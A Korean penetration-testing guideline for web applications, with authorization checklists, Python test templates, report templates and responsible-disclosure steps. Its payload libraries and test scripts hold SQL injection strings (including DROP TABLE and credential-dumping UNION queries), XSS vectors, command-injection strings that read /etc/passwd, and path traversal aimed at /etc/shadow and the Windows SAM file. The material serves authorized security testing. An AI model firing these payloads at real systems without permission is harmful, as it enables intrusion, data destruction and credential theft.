# 웹 애플리케이션 보안 테스트 가이드라인

**작성 기반:** TargetApp API 실제 침투 테스트 경험
**작성일:** 2025년 11월 28일
**목적:** 다른 웹사이트 보안 테스트 시 재사용 가능한 표준 프로세스 및 체크리스트

---

## 📋 목차

1. [사전 준비](#1-사전-준비)
2. [정보 수집 체크리스트](#2-정보-수집-체크리스트)
3. [테스트 환경 셋업](#3-테스트-환경-셋업)
4. [단계별 테스트 가이드](#4-단계별-테스트-가이드)
5. [페이로드 라이브러리](#5-페이로드-라이브러리)
6. [자동화 템플릿](#6-자동화-템플릿)
7. [보고서 작성 가이드](#7-보고서-작성-가이드)
8. [법적/윤리적 고려사항](#8-법적윤리적-고려사항)

---

## 1. 사전 준비

### 1.1 필수 도구 설치

```bash
# Python 환경
python3 --version  # 3.8 이상
pip install requests
pip install selenium  # 브라우저 자동화 (선택)

# 기타 도구
sudo apt install curl jq  # API 테스트
google-chrome  # 또는 firefox

# 선택 도구
burpsuite  # GUI 프록시 도구
owasp-zap  # 자동 스캐너
```

### 1.2 프로젝트 구조 생성

```bash
# 표준 디렉토리 구조
mkdir -p security-test-[TARGET_NAME]
cd security-test-[TARGET_NAME]

mkdir -p {tests,logs,reports,payloads,screenshots}

# 폴더 설명:
# tests/      - 테스트 스크립트
# logs/       - 실행 로그 (타임스탬프)
# reports/    - 최종 보고서
# payloads/   - 페이로드 모음
# screenshots/ - 브라우저 테스트 캡처
```

### 1.3 법적 승인 확보

**⚠️ 매우 중요 - 반드시 확인!**

```
체크리스트:
□ 서면 승인 받음 (이메일, 계약서)
□ 테스트 범위 명확히 정의
□ 테스트 기간 합의
□ 긴급 연락망 확보
□ 책임 범위 명시

승인 없이 테스트 시:
- 불법 해킹으로 간주 (정보통신망법 위반)
- 형사 처벌 가능 (5년 이하 징역)
```

---

## 2. 정보 수집 체크리스트

### 2.1 기본 정보 수집

```bash
# 대상 웹사이트 정보
TARGET_URL="https://example.com"
TARGET_API="https://api.example.com"

# 1. DNS 정보
nslookup $TARGET_URL
dig $TARGET_URL

# 2. WHOIS 정보
whois example.com

# 3. 서브도메인 열거
# - 도구: Sublist3r, Amass, subfinder
# - 목적: 테스트 범위 확장 (api.*, admin.*, dev.*)

# 4. 기술 스택 파악
curl -I $TARGET_URL | grep -i server
curl -I $TARGET_URL | grep -i "x-powered-by"
```

### 2.2 HTTP 헤더 분석 체크리스트

```bash
# 보안 헤더 확인
curl -I https://example.com/api/endpoint

# 확인할 항목:
□ Server 정보 노출 여부
□ X-Powered-By 노출 여부
□ X-Frame-Options 존재 여부
□ X-Content-Type-Options: nosniff
□ Strict-Transport-Security (HSTS)
□ Content-Security-Policy (CSP)
□ X-XSS-Protection
□ Referrer-Policy
□ Permissions-Policy
```

**분석 예시:**
```http
# 좋은 예 ✅
Server: nginx  (버전 숨김)
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000

# 나쁜 예 ❌
Server: Apache/2.4.29 (Ubuntu)  (버전 노출)
(보안 헤더 없음)
```

### 2.3 기술 스택 추론

**체크리스트:**
```
프론트엔드:
□ React / Vue / Angular (개발자 도구 확인)
□ jQuery (소스 보기)
□ 빌드 도구 (webpack, vite)

백엔드:
□ 응답 속도 → 언어 추정 (빠름: Go/Rust, 중간: Python/Node, 느림: PHP)
□ 에러 메시지 형식 → 프레임워크 추정
□ 쿠키 이름 → 기술 추정 (PHPSESSID, connect.sid 등)

데이터베이스:
□ 에러 메시지 → DB 종류 (MySQL, PostgreSQL, MongoDB)
□ 응답 구조 → NoSQL/SQL 추정
□ 검색 속도 → 검색 엔진 추정 (Elasticsearch, Solr)

인증:
□ JWT (쿠키, Authorization 헤더)
□ 세션 기반 (Set-Cookie: session_id)
□ OAuth (oauth_token)
```

---

## 3. 테스트 환경 셋업

### 3.1 Python 테스트 템플릿

**`base_template.py` - 모든 테스트의 기본 템플릿**

```python
#!/usr/bin/env python3
"""
테스트명: [테스트 목적]
작성일: YYYY-MM-DD
대상: https://example.com
"""

import requests
import time
from datetime import datetime
import json

# ===== 설정 =====
TARGET_URL = "https://example.com/api/endpoint"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Security Test)",
    # 인증이 필요한 경우:
    # "Authorization": "Bearer YOUR_TOKEN"
}
TIMEOUT = 10  # 초

# ===== 로그 설정 =====
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
log_file = open(f"logs/test_name_{timestamp}.log", "w", encoding="utf-8")

def log_print(message):
    """콘솔과 파일에 동시 출력"""
    print(message)
    log_file.write(message + "\n")
    log_file.flush()

# ===== 유틸리티 함수 =====
def send_request(method="GET", url=None, params=None, data=None, json_data=None):
    """HTTP 요청 전송 및 응답 처리"""
    try:
        start_time = time.time()

        if method.upper() == "GET":
            response = requests.get(url or TARGET_URL, params=params, headers=HEADERS, timeout=TIMEOUT)
        elif method.upper() == "POST":
            response = requests.post(url or TARGET_URL, data=data, json=json_data, headers=HEADERS, timeout=TIMEOUT)

        response_time = time.time() - start_time

        return {
            "status_code": response.status_code,
            "response_time": response_time,
            "headers": dict(response.headers),
            "body": response.text,
            "json": response.json() if response.headers.get("Content-Type", "").startswith("application/json") else None
        }

    except requests.exceptions.Timeout:
        return {"error": "Timeout", "response_time": TIMEOUT}
    except requests.exceptions.RequestException as e:
        return {"error": str(e)}

# ===== 테스트 시작 =====
def main():
    log_print("="*60)
    log_print(f"테스트 시작: {datetime.now()}")
    log_print(f"대상 URL: {TARGET_URL}")
    log_print("="*60 + "\n")

    # TODO: 여기에 테스트 로직 작성

    log_print("\n" + "="*60)
    log_print(f"테스트 종료: {datetime.now()}")
    log_print("="*60)
    log_file.close()

if __name__ == "__main__":
    main()
```

### 3.2 통계 추적 템플릿

```python
# 테스트 통계 추적 (선택사항)
test_stats = {
    "total_tests": 0,
    "success": 0,
    "failures": 0,
    "status_codes": {},
    "response_times": [],
    "vulnerabilities": []
}

def update_stats(result, test_name=""):
    """테스트 결과 통계 업데이트"""
    test_stats["total_tests"] += 1

    if "error" in result:
        test_stats["failures"] += 1
    else:
        status = result["status_code"]
        test_stats["status_codes"][status] = test_stats["status_codes"].get(status, 0) + 1
        test_stats["response_times"].append({
            "test": test_name,
            "time": result["response_time"]
        })

        if status == 200:
            test_stats["success"] += 1

def print_stats():
    """통계 출력"""
    log_print("\n" + "="*60)
    log_print("테스트 통계")
    log_print("="*60)
    log_print(f"총 테스트: {test_stats['total_tests']}")
    log_print(f"성공: {test_stats['success']}")
    log_print(f"실패: {test_stats['failures']}")

    log_print("\n[상태 코드 분포]")
    for code, count in sorted(test_stats['status_codes'].items()):
        percentage = (count / test_stats['total_tests']) * 100
        log_print(f"  {code}: {count}회 ({percentage:.1f}%)")

    if test_stats['response_times']:
        times = [t['time'] for t in test_stats['response_times']]
        log_print(f"\n[응답 시간]")
        log_print(f"  평균: {sum(times)/len(times):.3f}초")
        log_print(f"  최소: {min(times):.3f}초")
        log_print(f"  최대: {max(times):.3f}초")

        # 가장 느린 5개
        slowest = sorted(test_stats['response_times'], key=lambda x: x['time'], reverse=True)[:5]
        log_print(f"\n[가장 느린 테스트 TOP 5]")
        for i, item in enumerate(slowest, 1):
            log_print(f"  {i}. {item['test']}: {item['time']:.3f}초")
```

---

## 4. 단계별 테스트 가이드

### Phase 1: Rate Limiting 테스트

**목적:** DDoS 공격 방어 능력 확인

**체크리스트:**
```
□ 테스트 요청 수 결정 (권장: 100~200개)
□ 요청 간격 결정 (권장: 0.1초)
□ 예상 제한 파악 (10/분, 100/시간 등)
□ 429 응답 확인
□ Retry-After 헤더 확인
```

**테스트 스크립트:**
```python
# test_rate_limiting.py
NUM_REQUESTS = 150
DELAY = 0.1

def test_rate_limiting():
    rate_limited_count = 0

    for i in range(1, NUM_REQUESTS + 1):
        result = send_request(method="GET", params={"page": 1, "size": 10})

        if result.get("status_code") == 429:
            rate_limited_count += 1
            log_print(f"⚠️  요청 {i}: 429 Too Many Requests (Rate Limited!)")

            # Retry-After 헤더 확인
            retry_after = result.get("headers", {}).get("Retry-After")
            if retry_after:
                log_print(f"   Retry-After: {retry_after}초")

        elif result.get("status_code") == 200:
            log_print(f"✓ 요청 {i}: 200 OK")

        time.sleep(DELAY)

    # 결과 분석
    log_print(f"\n총 요청: {NUM_REQUESTS}")
    log_print(f"Rate Limited: {rate_limited_count}회 ({rate_limited_count/NUM_REQUESTS*100:.1f}%)")

    if rate_limited_count == 0:
        log_print("🚨 치명적: Rate Limiting이 없습니다!")
        test_stats["vulnerabilities"].append({
            "type": "No Rate Limiting",
            "severity": "Critical",
            "cvss": 7.5
        })
```

**예상 결과:**
- ✅ 안전: 10~20번째 요청부터 429 응답
- 🚨 취약: 모든 요청 200 OK

---

### Phase 2: Input Validation 테스트

**목적:** 입력 검증 수준 파악

**체크리스트:**
```
파라미터별 테스트:
□ 경계값 (0, -1, 최대값+1)
□ 타입 오류 (문자열 → 숫자 필드)
□ Null/None 값
□ 매우 큰 값
□ 특수 문자
□ SQL Injection 기본 페이로드
□ XSS 기본 페이로드
```

**테스트 스크립트:**
```python
# test_input_validation.py

# 1. 경계값 테스트
boundary_tests = [
    ({"page": 0}, "page=0 (경계값)"),
    ({"page": -1}, "page=-1 (음수)"),
    ({"page": 999999}, "page=999999 (큰 값)"),
    ({"size": 0}, "size=0"),
    ({"size": 301}, "size=301 (최대값+1)"),
]

for params, desc in boundary_tests:
    result = send_request(params=params)
    status = result.get("status_code")

    if status == 422:
        log_print(f"✓ [{desc}] 422 - 입력 검증 성공")
    elif status == 400:
        log_print(f"✓ [{desc}] 400 - Bad Request")
    elif status == 500:
        log_print(f"🚨 [{desc}] 500 - 서버 에러 (검증 누락!)")
        test_stats["vulnerabilities"].append({
            "type": f"Input Validation Error: {desc}",
            "severity": "Medium",
            "cvss": 5.3
        })
    else:
        log_print(f"? [{desc}] {status}")

# 2. 타입 오류 테스트
type_tests = [
    ({"page": "abc"}, "page=abc (문자열)"),
    ({"page": None}, "page=null"),
    ({"page": 1.5}, "page=1.5 (실수)"),
]

for params, desc in type_tests:
    result = send_request(params=params)
    # 동일한 로직...

# 3. SQL Injection 기본 테스트
sql_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "1' UNION SELECT NULL--",
]

for payload in sql_payloads:
    result = send_request(params={"query_string": payload})

    # SQL 에러 메시지 확인
    body = result.get("body", "")
    sql_errors = ["sql syntax", "mysql", "postgresql", "ora-", "sqlite"]

    for error in sql_errors:
        if error.lower() in body.lower():
            log_print(f"🚨 SQL Injection 가능성: {payload}")
            log_print(f"   에러 메시지: {error}")
            break
```

---

### Phase 3: Authentication & Authorization 테스트

**체크리스트:**
```
□ 인증 없이 접근 가능한 엔드포인트 확인
□ 세션 관리 (JWT, Session Cookie)
□ IDOR (다른 사용자 데이터 접근)
□ 권한 상승 (일반 사용자 → 관리자)
□ 세션 고정 (Session Fixation)
□ CSRF 토큰 검증
```

**IDOR 테스트:**
```python
# test_idor.py

# 내 사용자 ID
MY_USER_ID = "1234"
# 다른 사용자 ID (추측)
OTHER_USER_IDS = ["1235", "1236", "1000", "9999"]

for user_id in OTHER_USER_IDS:
    result = send_request(url=f"{TARGET_URL}/user/{user_id}")
    status = result.get("status_code")

    if status == 200:
        log_print(f"🚨 IDOR 취약점: /user/{user_id} 접근 가능!")
        # 실제 데이터 확인 (민감정보 있는지)
        data = result.get("json", {})
        if "email" in data or "password" in data:
            log_print(f"   민감정보 노출: {list(data.keys())}")
    elif status == 401:
        log_print(f"✓ /user/{user_id}: 401 Unauthorized (인증 필요)")
    elif status == 403:
        log_print(f"✓ /user/{user_id}: 403 Forbidden (권한 없음)")
```

**JWT 보안 체크:**
```javascript
// 브라우저 개발자 도구에서 실행
// 1. HttpOnly 확인
console.log("JWT 토큰 접근 가능:", document.cookie.includes('token'));

// 2. 토큰 디코딩 (https://jwt.io)
const token = document.cookie.match(/token=([^;]+)/)?.[1];
if (token) {
    const parts = token.split('.');
    const payload = JSON.parse(atob(parts[1]));
    console.log("JWT Payload:", payload);

    // 확인 사항:
    // - exp (만료 시간) 적절한가?
    // - 민감한 정보 포함되어 있나? (비밀번호, 신용카드 등)
    // - alg: "none" 취약점?
}
```

---

### Phase 4: XSS (Cross-Site Scripting) 테스트

**체크리스트:**
```
□ Reflected XSS (URL 파라미터)
□ Stored XSS (DB 저장 후 출력)
□ DOM-based XSS (JavaScript로만 처리)
□ CSP (Content-Security-Policy) 우회
```

**XSS 페이로드 우선순위:**
```html
<!-- 1단계: 기본 테스트 -->
<script>alert('xss')</script>

<!-- 2단계: 이벤트 핸들러 -->
<img src=x onerror=alert('xss')>

<!-- 3단계: 다양한 태그 -->
<iframe src=javascript:alert('xss')>
<svg onload=alert('xss')>
<body onload=alert('xss')>

<!-- 4단계: 필터 우회 -->
<ScRiPt>alert('xss')</ScRiPt>  (대소문자)
<img src=x onerror="eval(atob('YWxlcnQoJ3hzcycp'))">  (Base64)
```

**브라우저 테스트 절차:**
```
1. 검색창/입력 필드에 페이로드 입력
2. F12 → Elements → 검색어가 표시된 부분 확인
3. 확인 사항:
   - HTML로 파싱되었는가? → 취약
   - &lt;script&gt; 처럼 이스케이프되었는가? → 안전
   - textContent vs innerHTML 사용?
```

**자동 확인 스크립트:**
```javascript
// 브라우저 콘솔에서 실행
function checkXSS(payload) {
    const testId = 'xss-test-' + Math.random();

    // 1. DOM에서 찾기
    const hasPayload = document.body.innerHTML.includes(payload);
    const isEscaped = document.body.innerHTML.includes('&lt;');

    console.log('=== XSS 테스트 결과 ===');
    console.log('페이로드:', payload);
    console.log('DOM에 존재:', hasPayload);
    console.log('이스케이프됨:', isEscaped);

    if (hasPayload && !isEscaped) {
        console.warn('🚨 XSS 취약점 가능성 높음!');
    } else {
        console.log('✓ 안전함');
    }
}

// 사용 예:
checkXSS('<img src=x onerror=alert("xss")>');
```

---

### Phase 5: Injection 공격 테스트

**5.1 SQL Injection**

**페이로드 카테고리별 테스트:**

```python
# 완전한 SQL Injection 페이로드 리스트
sql_injection_payloads = {
    "basic_or": [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' OR 'a'='a",
    ],

    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT table_name FROM information_schema.tables--",
    ],

    "stacked_queries": [
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','pass')--",
        "'; UPDATE users SET admin=1 WHERE id=1--",
    ],

    "time_based_blind": [
        "' OR SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; WAITFOR DELAY '00:00:05'--",  # MS SQL
    ],

    "error_based": [
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
    ],
}

def test_sql_injection():
    for category, payloads in sql_injection_payloads.items():
        log_print(f"\n[{category.upper()} 테스트]")

        for payload in payloads:
            # Time-based는 시간 측정
            if "SLEEP" in payload or "WAITFOR" in payload:
                start = time.time()
                result = send_request(params={"q": payload})
                duration = time.time() - start

                if duration > 5:
                    log_print(f"🚨 Time-based SQL Injection: {payload}")
                    log_print(f"   응답 시간: {duration:.2f}초")
            else:
                result = send_request(params={"q": payload})

                # 에러 메시지 확인
                body = result.get("body", "").lower()
                sql_keywords = ["sql", "mysql", "syntax", "postgresql", "ora-"]

                for keyword in sql_keywords:
                    if keyword in body:
                        log_print(f"🚨 SQL 에러 노출: {payload}")
                        log_print(f"   키워드: {keyword}")
                        break
```

**5.2 NoSQL Injection (MongoDB, Elasticsearch)**

```python
nosql_payloads = {
    "mongodb": [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "1==1"}',
        '{"$regex": ".*"}',
    ],

    "elasticsearch": [
        '{"query": {"match_all": {}}}',
        '{"script": {"source": "..."}}',
    ]
}
```

**5.3 Command Injection**

```python
command_payloads = [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(whoami)",
    "\n cat /etc/passwd",
]

def test_command_injection():
    for payload in command_payloads:
        result = send_request(params={"file": payload})
        body = result.get("body", "")

        # 명령어 결과 패턴 확인
        patterns = ["root:", "bin/", "drwx", "uid="]

        for pattern in patterns:
            if pattern in body:
                log_print(f"🚨 Command Injection: {payload}")
                log_print(f"   패턴 발견: {pattern}")
                break
```

---

## 5. 페이로드 라이브러리

### 5.1 XSS 페이로드 (우선순위순)

```python
xss_payloads = {
    "priority_1_basic": [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
    ],

    "priority_2_event_handlers": [
        "<body onload=alert('xss')>",
        "<input autofocus onfocus=alert('xss')>",
        "<marquee onstart=alert('xss')>",
        "<details open ontoggle=alert('xss')>",
    ],

    "priority_3_bypass_filters": [
        "<ScRiPt>alert('xss')</ScRiPt>",  # 대소문자
        "<img src=x onerror=\"alert('xss')\">",  # 쌍따옴표
        "<img src=x onerror='alert(\"xss\")'>",  # 역따옴표
        "<img src=x onerror=`alert('xss')`>",  # 백틱
        "<img/src=x/onerror=alert('xss')>",  # 슬래시
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('xss')>",  # HTML 엔티티
    ],

    "priority_4_advanced": [
        "<iframe src=javascript:alert('xss')>",
        "<object data=javascript:alert('xss')>",
        "<embed src=javascript:alert('xss')>",
        "<a href=javascript:alert('xss')>click</a>",
    ],
}
```

### 5.2 SQL Injection 페이로드 데이터베이스

```python
sql_payloads_by_db = {
    "mysql": [
        "' OR '1'='1",
        "' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--",
        "' AND SLEEP(5)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
    ],

    "postgresql": [
        "' OR '1'='1'--",
        "'; SELECT pg_sleep(5)--",
        "' AND 1=CAST((SELECT version()) AS int)--",
    ],

    "mssql": [
        "' OR '1'='1'--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND 1=CONVERT(int, @@version)--",
    ],

    "oracle": [
        "' OR '1'='1'--",
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--",
    ],
}
```

### 5.3 Path Traversal 페이로드

```python
path_traversal_payloads = {
    "linux": [
        "../../../etc/passwd",
        "../../../../etc/shadow",
        "/etc/passwd",
        "....//....//....//etc/passwd",  # 점 4개
        "..%2f..%2f..%2fetc%2fpasswd",  # URL 인코딩
        "..%252f..%252f..%252fetc%252fpasswd",  # Double 인코딩
    ],

    "windows": [
        "..\\..\\..\\windows\\system32\\config\\sam",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
    ],
}
```

---

## 6. 자동화 템플릿

### 6.1 전체 테스트 실행 스크립트

```bash
#!/bin/bash
# run_all_tests.sh - 모든 보안 테스트 자동 실행

TARGET="https://example.com"
DATE=$(date +%Y%m%d_%H%M%S)
REPORT_DIR="reports/full_scan_$DATE"

mkdir -p $REPORT_DIR

echo "==================================="
echo "보안 테스트 시작: $TARGET"
echo "시작 시간: $(date)"
echo "==================================="

# Phase 1: Rate Limiting
echo "[1/6] Rate Limiting 테스트..."
python tests/test_rate_limiting.py > $REPORT_DIR/01_rate_limiting.log

# Phase 2: Input Validation
echo "[2/6] Input Validation 테스트..."
python tests/test_input_validation.py > $REPORT_DIR/02_input_validation.log

# Phase 3: Authentication
echo "[3/6] Authentication 테스트..."
python tests/test_authentication.py > $REPORT_DIR/03_authentication.log

# Phase 4: Error Handling
echo "[4/6] Error Handling 테스트..."
python tests/test_error_handling.py > $REPORT_DIR/04_error_handling.log

# Phase 5: Injection
echo "[5/6] Injection 공격 테스트..."
python tests/test_injection.py > $REPORT_DIR/05_injection.log

# Phase 6: 보고서 생성
echo "[6/6] 보고서 생성..."
python tools/generate_report.py --input $REPORT_DIR --output $REPORT_DIR/FINAL_REPORT.md

echo "==================================="
echo "테스트 완료: $(date)"
echo "보고서 위치: $REPORT_DIR/FINAL_REPORT.md"
echo "==================================="
```

### 6.2 보고서 자동 생성 스크립트

```python
# tools/generate_report.py
import os
import sys
import json
from datetime import datetime

def parse_logs(log_dir):
    """로그 파일에서 취약점 추출"""
    vulnerabilities = []

    for log_file in os.listdir(log_dir):
        if log_file.endswith('.log'):
            with open(os.path.join(log_dir, log_file), 'r') as f:
                content = f.read()

                # "🚨" 마커로 취약점 찾기
                if "🚨" in content:
                    lines = content.split('\n')
                    for line in lines:
                        if "🚨" in line:
                            vulnerabilities.append({
                                "source": log_file,
                                "description": line.replace("🚨", "").strip()
                            })

    return vulnerabilities

def generate_markdown_report(vulns, output_file):
    """마크다운 보고서 생성"""
    report = f"""# 보안 테스트 보고서

**생성일:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
**총 발견 취약점:** {len(vulns)}개

---

## 취약점 목록

"""

    for i, vuln in enumerate(vulns, 1):
        report += f"### {i}. {vuln['description']}\n\n"
        report += f"**출처:** {vuln['source']}\n\n"
        report += "**권장 조치:**\n- TODO\n\n"
        report += "---\n\n"

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(report)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--input', required=True, help='로그 디렉토리')
    parser.add_argument('--output', required=True, help='출력 파일')
    args = parser.parse_args()

    vulns = parse_logs(args.input)
    generate_markdown_report(vulns, args.output)
    print(f"보고서 생성 완료: {args.output}")
```

---

## 7. 보고서 작성 가이드

### 7.1 Executive Summary (경영진용)

**템플릿:**
```markdown
## Executive Summary

### 테스트 개요
- **대상 시스템:** [시스템명]
- **테스트 기간:** YYYY-MM-DD ~ YYYY-MM-DD
- **테스트 유형:** 웹 애플리케이션 침투 테스트
- **테스트 범위:** [엔드포인트 목록]

### 주요 발견사항
- 🔴 **Critical:** X건
- 🟡 **High:** Y건
- 🟢 **Medium:** Z건
- ⚪ **Low:** W건

### 비즈니스 영향
1. **즉시 위험:** [예: DDoS 공격 시 서비스 다운, 일 매출 XXX만원 손실]
2. **데이터 유출:** [예: 개인정보 X만 건 노출 위험, GDPR 위반 시 최대 X억 과징금]
3. **평판 손상:** [예: 보안 사고 시 고객 신뢰 하락]

### 권장 조치 (우선순위)
1. [1주 이내] Rate Limiting 구현 - 예상 개발 시간: 4시간
2. [2주 이내] XSS 방어 강화 - 예상 개발 시간: 8시간
3. [1개월 이내] 보안 헤더 추가 - 예상 개발 시간: 2시간
```

### 7.2 Technical Details (개발팀용)

**템플릿:**
```markdown
## 취약점 상세: [취약점명]

### 기본 정보
- **심각도:** Critical (CVSS 7.5)
- **CWE:** CWE-770 (Allocation of Resources Without Limits)
- **발견 위치:** `/api/expert_search`
- **발견 일시:** 2025-11-28

### 취약점 설명
[기술적 설명]

### 재현 방법
\```bash
# 1단계
curl ...

# 2단계
...
\```

### 증거
\```
[로그 또는 스크린샷]
\```

### 해결 방법
\```python
# 수정 전
def api_endpoint():
    return data

# 수정 후
@limiter.limit("10/minute")
def api_endpoint():
    return data
\```

### 검증 방법
\```bash
# 11번째 요청 시 429 확인
for i in {1..15}; do curl ...; done
\```
```

### 7.3 CVSS 점수 계산 가이드

**CVSS v3.1 계산기:** https://www.first.org/cvss/calculator/3.1

**주요 메트릭:**
```
Attack Vector (AV):
- Network (N): 인터넷에서 공격 가능
- Adjacent (A): 같은 네트워크
- Local (L): 로컬 접근 필요
- Physical (P): 물리적 접근 필요

Attack Complexity (AC):
- Low (L): 특별한 조건 없음
- High (H): 특정 조건 필요

Privileges Required (PR):
- None (N): 인증 불필요
- Low (L): 일반 사용자
- High (H): 관리자

Confidentiality Impact (C):
- None (N): 정보 노출 없음
- Low (L): 일부 정보 노출
- High (H): 모든 정보 노출
```

**예시:**
```
Rate Limiting 부재:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
= 7.5 (High)

XSS (Stored):
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
= 6.5 (Medium)
```

---

## 8. 법적/윤리적 고려사항

### 8.1 승인 체크리스트

**⚠️ 테스트 전 반드시 확인:**

```
□ 서면 승인 획득 (이메일, 계약서)
  - 회사 대표/담당자 서명
  - 테스트 범위 명시
  - 테스트 기간 명시

□ 면책 조항 포함
  - 서비스 중단 가능성 고지
  - 데이터 손실 면책
  - 법적 책임 한계

□ 긴급 연락망 확보
  - 개발팀 담당자 연락처
  - 인프라 담당자 연락처
  - 비상 중단 프로세스

□ 백업 확인
  - 테스트 전 DB 백업
  - 롤백 계획 수립
```

### 8.2 금지 행위

**절대 하지 말아야 할 것:**
```
❌ 승인 없는 테스트
❌ 파괴적 공격 (DROP TABLE, rm -rf 등)
❌ DDoS 공격 (과도한 트래픽)
❌ 개인정보 유출/다운로드
❌ 발견한 취약점 공개 (책임 있는 공개 원칙)
❌ 발견한 취약점 악용
❌ 범위 외 시스템 테스트
```

### 8.3 책임 있는 공개 (Responsible Disclosure)

**절차:**
```
1. 취약점 발견
   ↓
2. 즉시 개발팀에 비공개 보고
   ↓
3. 개발팀 수정 기간 제공 (30~90일)
   ↓
4. 수정 완료 확인
   ↓
5. (선택) 공개 (CVE 등록, 블로그 포스팅)
```

**보고 템플릿:**
```
제목: [긴급] [서비스명] 보안 취약점 발견 보고

안녕하세요,

[서비스명]에 대한 보안 테스트 중 취약점을 발견하여 보고드립니다.

1. 취약점 유형: [예: SQL Injection]
2. 심각도: Critical (CVSS 9.8)
3. 발견 위치: /api/login
4. 재현 방법: [첨부 문서 참조]
5. 예상 영향: 전체 사용자 계정 탈취 가능

상세 내용은 첨부 문서를 참조해 주시기 바랍니다.
빠른 조치를 부탁드리며, 수정 완료 시까지 외부 공개를 자제하겠습니다.

[연락처]
```

---

## 9. 추가 자료

### 9.1 참고 문서

**OWASP:**
- OWASP Top 10 2021: https://owasp.org/Top10/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Cheat Sheet: https://cheatsheetseries.owasp.org/

**보안 표준:**
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- CWE Top 25: https://cwe.mitre.org/top25/
- PTES: http://www.pentest-standard.org/

**학습 플랫폼:**
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackTheBox: https://www.hackthebox.com/
- TryHackMe: https://tryhackme.com/

### 9.2 자주 사용하는 명령어

```bash
# HTTP 헤더 확인
curl -I https://example.com

# JSON 응답 예쁘게 출력
curl https://api.example.com | jq

# 응답 시간 측정
curl -w "@curl-format.txt" -o /dev/null -s https://example.com

# curl-format.txt 내용:
# time_total: %{time_total}\n

# SSL/TLS 정보 확인
openssl s_client -connect example.com:443

# 포트 스캔
nmap -sV example.com
```

### 9.3 도구 비교표

| 도구 | 용도 | 장점 | 단점 | 가격 |
|------|------|------|------|------|
| **Burp Suite** | 프록시, 스캐너 | 강력, GUI | 느림, 복잡 | $399/년 |
| **OWASP ZAP** | 자동 스캐너 | 무료, 오픈소스 | 오탐 많음 | 무료 |
| **SQLMap** | SQL Injection | 자동화 | SQL만 | 무료 |
| **Nikto** | 웹 스캐너 | 빠름 | 오탐 많음 | 무료 |
| **Python + requests** | 커스텀 테스트 | 유연, 자동화 | 코드 필요 | 무료 |

---

## 10. 버전 히스토리

- **v1.0 (2025-11-28):** 초기 가이드라인 작성 (TargetApp 테스트 기반)
- **v1.1 (예정):** 자동화 도구 추가
- **v2.0 (예정):** API vs 웹앱 분리 가이드

---

**작성자:** Security Testing Team
**최종 수정:** 2025-11-28
**라이선스:** MIT License (자유롭게 사용 가능)

**피드백 및 개선 제안:**
- GitHub Issues
- Email: security@example.com
